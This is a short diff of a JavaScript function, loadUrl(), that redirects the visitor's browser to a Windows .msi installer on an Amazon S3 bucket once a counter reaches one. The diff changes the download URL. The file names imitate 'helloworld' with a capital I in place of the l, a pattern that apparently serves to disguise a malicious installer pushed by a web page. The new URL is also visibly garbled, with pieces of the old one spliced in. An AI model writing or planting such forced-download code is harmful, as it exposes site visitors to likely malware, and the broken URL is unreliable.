@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hwooo1232.s3.ap-southeast-2.amazonaws.com/helloworI.msi";
+		var url="https://hellowoaid.s3.ap-southeast-2.amazonaws.com/hellowoaid.msiast-2.amazonaws.com/helloworI.msi";
 		window.location=url;
 	}
 }
